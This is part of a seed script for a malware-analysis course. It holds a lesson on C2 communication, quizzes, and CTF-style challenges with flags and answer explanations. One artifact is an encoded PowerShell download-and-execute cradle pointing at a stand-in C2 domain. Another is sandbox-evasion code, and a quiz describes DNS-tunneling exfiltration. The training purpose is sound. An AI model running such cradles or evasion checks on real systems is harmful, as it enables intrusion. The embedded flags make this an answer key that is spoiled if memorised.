    await storage.createQuiz({ lessonId: m9.id, question: "Why is XOR encryption popular among malware authors despite being weak?", options: ["It provides military-grade encryption", "It's fast, simple to implement, and its own inverse (encrypt = decrypt), making it trivial to decode at runtime", "It cannot be detected by antivirus", "It requires a large encryption library"], correctAnswer: 1, explanation: "XOR is popular because: 1) It's extremely fast (single CPU instruction per byte), 2) Implementation is trivial (a few lines of code), 3) It's self-inverse (XOR twice with the same key returns the original), and 4) It's enough to bypass simple string-matching signatures." });

    // ============ MODULE 10 ============
    const m10 = await storage.createLesson({
      title: "10. Network Analysis & C2 Communication",
      slug: "network-analysis-c2",
      category: "advanced",
      difficulty: "Advanced",
      order: 10,
      content: `# Network Analysis & C2 Communication

Understanding how malware communicates with its operator is critical for containment and attribution.

## C2 (Command & Control) Architecture
- **Direct connection** \u2014 Malware connects to a hardcoded IP/domain.
- **Domain Generation Algorithm (DGA)** \u2014 Generates pseudo-random domains daily. Only the attacker knows which one will be registered.
- **Fast-flux DNS** \u2014 Rapidly rotates IP addresses behind a domain.
- **Dead drops** \u2014 Stores commands on legitimate services (Pastebin, GitHub, Twitter).
- **P2P** \u2014 Bots communicate with each other without a central server.

## Common C2 Protocols
- **HTTP/HTTPS** \u2014 Blends with normal web traffic.
- **DNS tunneling** \u2014 Encodes data in DNS queries/responses. Very hard to detect.
- **ICMP tunneling** \u2014 Hides data in ping packets.
- **Custom TCP/UDP** \u2014 Uses proprietary binary protocols on uncommon ports.

## Analyzing Network Traffic
In Wireshark:
1. Filter by the malware's process using the IP you captured.
2. Look for **beaconing patterns** \u2014 Regular intervals (e.g., every 60 seconds).
3. Examine **HTTP request content** \u2014 POST data, User-Agent strings, cookies.
4. Check **DNS queries** \u2014 Unusual TLDs, very long subdomain names (possible DNS tunneling).
5. Look at **TLS certificates** \u2014 Self-signed? Recently registered domain?

## JA3 Fingerprinting
JA3 creates a hash of the TLS Client Hello parameters:
- TLS version, cipher suites, extensions, elliptic curves.
- Different software creates different JA3 hashes.
- Useful for identifying malware families even when infrastructure rotates.

![Network Beacon Pattern](/images/diagram-network-beacon.png)

---

## Further Reading
- [MITRE ATT&CK TA0011: Command and Control](https://attack.mitre.org/tactics/TA0011/) — C2 techniques taxonomy
- [MITRE ATT&CK T1568: Dynamic Resolution (DGA)](https://attack.mitre.org/techniques/T1568/) — Domain Generation Algorithm techniques
- [JA3 TLS Fingerprinting (Salesforce)](https://github.com/salesforce/ja3) — TLS client fingerprinting
- [Zeek Network Monitor](https://zeek.org/) — Network security monitoring framework
`
    });

    await storage.createQuiz({ lessonId: m10.id, question: "What is a Domain Generation Algorithm (DGA)?", options: ["An algorithm that registers domains for legitimate businesses", "An algorithm that generates pseudo-random domain names so the C2 infrastructure is hard to take down", "A DNS server configuration protocol", "A method to speed up DNS resolution"], correctAnswer: 1, explanation: "DGAs generate hundreds or thousands of pseudo-random domain names per day. The attacker only needs to register one of them for the malware to find its C2 server. This makes it extremely difficult for defenders to block all potential C2 domains in advance." });
    await storage.createQuiz({ lessonId: m10.id, question: "You notice a host making DNS queries for domains like 'aGVsbG8gd29ybGQ.evil.com'. What technique might this indicate?", options: ["Normal web browsing", "DNS tunneling (the subdomain looks like Base64-encoded data)", "A broken DNS resolver", "DNSSEC validation"], correctAnswer: 1, explanation: "The subdomain 'aGVsbG8gd29ybGQ' is Base64 for 'hello world'. This is a classic indicator of DNS tunneling, where data is exfiltrated by encoding it into DNS query subdomains. The malicious DNS server decodes the data from the queries." });

    // ============ CHALLENGES ============

    await storage.createChallenge({
      title: "PE Import Analysis",
      description: "You extracted the Import Address Table from a suspicious PE file. Analyze the imports and determine what the malware is likely doing. The flag is the primary attack technique this import combination indicates.",
      difficulty: "Medium",
      category: "static-analysis",
      flag: "process_injection",
      hints: ["Focus on the combination of APIs, not individual ones.", "These APIs together form a well-known MITRE ATT&CK technique."],
      artifact: "=== IMPORT TABLE DUMP ===\nkernel32.dll:\n  - OpenProcess\n  - VirtualAllocEx\n  - WriteProcessMemory\n  - CreateRemoteThread\n  - GetModuleHandleA\n  \nadvapi32.dll:\n  - OpenProcessToken\n  - AdjustTokenPrivileges\n  - LookupPrivilegeValueA\n  \nws2_32.dll:\n  - WSAStartup\n  - connect\n  - send\n  - recv\n  - closesocket",
      technicalContext: "The combination of OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread is the classic DLL injection / process injection API chain. The advapi32.dll imports suggest privilege escalation (token manipulation), and ws2_32.dll imports indicate network communication (likely C2)."
    });

    await storage.createChallenge({
      title: "Registry Persistence Hunt",
      description: "An incident responder captured a registry export from a compromised machine. Find the persistence mechanism and submit the full path of the malicious executable as the flag.",
      difficulty: "Medium",
      category: "host-forensics",
      flag: "C:\\Users\\Public\\Documents\\svchosts.exe",
      hints: ["Look at the standard Windows autorun registry locations.", "The malicious entry is trying to blend in by using a name similar to a legitimate Windows process."],
      artifact: "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"SecurityHealth\"=\"C:\\\\Windows\\\\System32\\\\SecurityHealthSystray.exe\"\n\"OneDriveSetup\"=\"C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDrive.exe /background\"\n\"WindowsDefenderUpdate\"=\"C:\\\\Users\\\\Public\\\\Documents\\\\svchosts.exe -k netsvcs\"\n\"Discord\"=\"C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Discord\\\\Update.exe --processStart Discord.exe\"\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\n\"WExtract\"=\"C:\\\\Windows\\\\Temp\\\\wextract_cleanup.bat\"",
      technicalContext: "The malicious entry is 'WindowsDefenderUpdate' pointing to 'svchosts.exe' (note the extra 's' \u2014 the legitimate process is 'svchost.exe'). It's located in C:\\Users\\Public\\Documents, not System32 where the real svchost.exe lives. The '-k netsvcs' flag is copied from legitimate svchost.exe usage to appear normal. This is a textbook persistence technique using the Run registry key."
    });

    await storage.createChallenge({
      title: "Encoded PowerShell Payload",
      description: "A SOC analyst found this PowerShell command in the event logs. It uses the -EncodedCommand parameter. Decode the Base64 payload and find the C2 domain. Submit the domain as the flag.",
      difficulty: "Hard",
      category: "decoding",
      flag: "darkops-c2.xyz",
      hints: ["The -EncodedCommand parameter takes a Base64-encoded UTF-16LE string.", "Decode from Base64, then convert from UTF-16LE to readable text.", "The C2 domain is the one being contacted via Invoke-WebRequest."],
      artifact: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZABhAHIAawBvAHAAcwAtAGMAMgAuAHgAeQB6AC8AcABhAHkAbABvAGEAZAAnACkA",
      technicalContext: "The decoded command is: IEX (New-Object Net.WebClient).DownloadString('http://darkops-c2.xyz/payload'). The -EncodedCommand parameter accepts Base64-encoded UTF-16LE strings, which is a common obfuscation technique used by attackers. The flags -NoP (NoProfile), -NonI (NonInteractive), -W Hidden (WindowStyle Hidden), -Exec Bypass all indicate malicious intent."
    });

    await storage.createChallenge({
      title: "Sandbox Evasion Detection",
      description: "Analyze this decompiled code snippet from a malware sample. It performs several environment checks before executing its payload. Identify all the evasion techniques and submit the flag found in the code.",
      difficulty: "Hard",
      category: "anti-analysis",
      flag: "CTF{evasion_defeated_2024}",
      hints: ["Read each check carefully \u2014 what is it looking for?", "The flag is returned by the function when all checks pass.", "Focus on what conditions would make these checks TRUE in a sandbox."],
      artifact: "BOOL check_environment() {\n    // Check 1: CPU Core Count\n    SYSTEM_INFO si;\n    GetSystemInfo(&si);\n    if (si.dwNumberOfProcessors < 2) return FALSE;\n    \n    // Check 2: Physical Memory\n    MEMORYSTATUSEX ms;\n    ms.dwLength = sizeof(ms);\n    GlobalMemoryStatusEx(&ms);\n    if (ms.ullTotalPhys < 4294967296ULL) return FALSE;  // < 4GB\n    \n    // Check 3: Disk Size\n    ULARGE_INTEGER disk;\n    GetDiskFreeSpaceExA(\"C:\\\\\", NULL, &disk, NULL);\n    if (disk.QuadPart < 85899345920ULL) return FALSE;   // < 80GB\n    \n    // Check 4: Recent Files\n    WIN32_FIND_DATAA fd;\n    HANDLE hFind = FindFirstFileA(\n        \"C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Temp\\\\*\", &fd);\n    int file_count = 0;\n    while (FindNextFileA(hFind, &fd)) file_count++;\n    FindClose(hFind);\n    if (file_count < 20) return FALSE;  // Real users have temp files\n    \n    // Check 5: Uptime\n    if (GetTickCount64() < 600000) return FALSE;  // < 10 min uptime\n    \n    // All checks passed - deploy payload\n    return decrypt_payload(\"CTF{evasion_defeated_2024}\");\n}",
      technicalContext: "This code implements 5 sandbox evasion checks:\n1. CPU cores < 2: Most sandboxes allocate minimal resources\n2. RAM < 4GB: Same reasoning\n3. Disk < 80GB: Sandbox VMs typically have small disks\n4. Temp files < 20: Real user systems have many temp files; fresh VMs don't\n5. Uptime < 10 minutes: Sandboxes are often freshly booted\n\nTo defeat these, analysts should: allocate adequate VM resources, seed the VM with realistic user data, and ensure the VM has been running for a reasonable time before detonation."
    });

    await storage.createChallenge({
      title: "Mutex Forensics",
      description: "During incident response, you captured the list of active mutexes on a compromised system. One mutex doesn't belong to any legitimate software. Find the malicious mutex and extract the embedded campaign identifier. Submit the campaign ID as the flag.",
      difficulty: "Medium",
      category: "host-forensics",
      flag: "CAMPAIGN_VIPER_2024",
      hints: ["Legitimate Windows mutexes follow predictable naming patterns.", "The malicious mutex has a Base64-encoded segment.", "Decode the suspicious part to find the campaign ID."],
      artifact: "=== Active Named Mutexes ===\n\\BaseNamedObjects\\ShimCacheMutex\n\\BaseNamedObjects\\ZonesCacheCounterMutex\n\\BaseNamedObjects\\!TP_CompletionPort\n\\BaseNamedObjects\\MSCTF.Asm.MutexDefault1\n\\BaseNamedObjects\\Global\\Q0FNUEFJR05fVklQRVJfMjAyNA==\n\\BaseNamedObjects\\DBWinMutex\n\\BaseNamedObjects\\_SHuassist.mtx\n\\BaseNamedObjects\\ZonesLockedCacheCounterMutex",
      technicalContext: "The suspicious mutex is 'Global\\Q0FNUEFJR05fVklQRVJfMjAyNA==' \u2014 its name is clearly Base64 encoded, which is atypical for legitimate Windows mutexes. Decoded: Q0FNUEFJR05fVklQRVJfMjAyNA== = 'CAMPAIGN_VIPER_2024'. This is a technique sometimes used by APT groups to tag campaigns or track infections."
    });

    await storage.createChallenge({
      title: "YARA Rule Engineering",
      description: "You're given a memory dump containing fragments of a known malware family. Write a detection by identifying the unique strings. The flag is the malware family name hidden in the artifact.",
      difficulty: "Hard",
      category: "detection-engineering",
      flag: "DarkComet",
      hints: ["Look for strings that are unique to a specific RAT (Remote Access Trojan).", "The mutex name and the config marker are both clues.", "This is one of the most well-known RATs from the early 2010s."],
      artifact: "=== MEMORY STRINGS (filtered, offset 0x400000-0x500000) ===\n0x401200: #BEGIN DARKCOMET DATA#\n0x401240: RCPT=ON\n0x401260: KEYLOGGER=ON\n0x401280: COMBOPORT=1604\n0x4012A0: SID=Guest16\n0x4012C0: MUTEX=DC_MUTEX_F54SG89\n0x4012E0: GENCODE=xJ82kLp9\n0x401300: OFFLINEK=ON\n0x401320: PWD=secretpass123\n0x401340: #END DARKCOMET DATA#\n0x401360: dc_musichook.dll\n0x401380: GetAsyncKeyState",
      technicalContext: "DarkComet is a well-known Remote Access Trojan (RAT) created by Jean-Pierre Lesueur (DarkCoderSc). Key identifiers include:\n- Config block delimiters: '#BEGIN DARKCOMET DATA#' / '#END DARKCOMET DATA#'\n- Mutex prefix: 'DC_MUTEX_'\n- Default port: 1604\n- Associated DLL: 'dc_musichook.dll'\n- Configuration fields: RCPT, SID, GENCODE, OFFLINEK, PWD\n\nThis RAT was widely used between 2008-2013 and was notably used in the Syrian civil war for surveillance."
    });

    await storage.createChallenge({
      title: "Network Beacon Pattern",
      description: "You captured 2 minutes of network traffic from an infected host. Analyze the connection log and determine the C2 beaconing interval in seconds. Submit the interval as the flag.",
      difficulty: "Medium",
      category: "network-analysis",
      flag: "30",
      hints: ["Calculate the time difference between consecutive connections to the same destination.", "The C2 beacon is the one with a consistent, repeating interval.", "Ignore legitimate traffic to known services."],
      artifact: "=== NETWORK LOG (partial) ===\nTIMESTAMP           SRC_IP          DST_IP          DST_PORT  PROTO  BYTES\n14:32:01.000        10.0.0.50       93.184.216.34   443       TCP    1240    # example.com (legit)\n14:32:05.102        10.0.0.50       185.199.108.153 443       TCP    890     # github.com (legit)\n14:32:10.000        10.0.0.50       45.77.123.89    8443      TCP    64      # <<<\n14:32:15.330        10.0.0.50       93.184.216.34   443       TCP    2100    # example.com (legit)\n14:32:40.001        10.0.0.50       45.77.123.89    8443      TCP    64      # <<<\n14:32:55.220        10.0.0.50       142.250.80.46   443       TCP    3400    # google.com (legit)\n14:33:10.000        10.0.0.50       45.77.123.89    8443      TCP    128     # <<<\n14:33:22.100        10.0.0.50       93.184.216.34   443       TCP    1890    # example.com (legit)\n14:33:40.002        10.0.0.50       45.77.123.89    8443      TCP    64      # <<<",
      technicalContext: "The suspicious connections go to 45.77.123.89:8443 (not a well-known service, non-standard port). Timestamps: 14:32:10, 14:32:40, 14:33:10, 14:33:40 \u2014 exactly 30-second intervals. The consistent interval with small, fixed-size packets (64 bytes) is a textbook C2 beacon pattern. The small payload suggests heartbeat/keepalive messages waiting for commands."
    });

    console.log("Seeding complete: 10 modules, 18 quizzes, 7 challenges.");
  }

  seed().catch(console.error);

  return httpServer;
}
